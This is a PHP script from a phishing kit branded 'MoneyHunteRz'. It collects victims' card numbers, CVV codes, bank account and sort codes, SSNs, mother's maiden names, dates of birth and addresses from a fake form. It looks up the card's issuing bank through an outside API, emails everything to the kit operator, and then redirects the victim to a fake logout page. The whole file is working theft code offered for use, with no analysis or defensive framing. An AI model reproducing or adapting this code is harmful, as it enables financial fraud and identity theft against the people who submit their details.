<?php

include('../../detect.php');

$bin     = str_replace(' ', '', $_POST['cc_number']);
$bin     = substr($bin, 0, 6);
$getbank = json_decode(file_get_contents("https://bins.ribbon.co/api/v1/bins/".$bin.""));
$ccbrand = $getbank->brand;
$ccbank  = $getbank->issuer;
$cctype  = $getbank->type;
$ccklas  = $getbank->card_category;

//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$message ="
++------[ $$ MoneyHunteRz $$ ]------++
-- If Money Not Rest We Cant Sleep --

      .++=====[ CreditCard ]=====++.
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  ".$ccbank." - ".$cctype." - ".$ccklas."
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']."
Account number  :  ".$_POST['accnum']."
BSB Number      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . "
OSID Number     :  " . $_POST['osidnum'] . "
Credit Limit    :  " . $_POST['cc_limit'] . "
Mother's name   :  ".$_POST['mmd']."
      .++=========[ End ]=========++.

      .++===[ Address & Info ]===++.
Account Name    :  ".$_POST['full_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']."
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']."
      .++=========[ End ]=========++.

      .++=======[ PC Info ]=======++.
From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++=========[ End ]=========++.

++------[ $$ Results Boss Jodi $$ ]------++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\

include('../../____YourMail____.php');
$subject = $ccbrand . " " . $cctype . " " . $ccbank . " [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: ".$_POST['cc_holder']." <jodi.id@money-hunterz.com>";
mail($emailku, $subject, $message, $headers);

header("LOCATION: redirscr?cmd=_logout&session=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>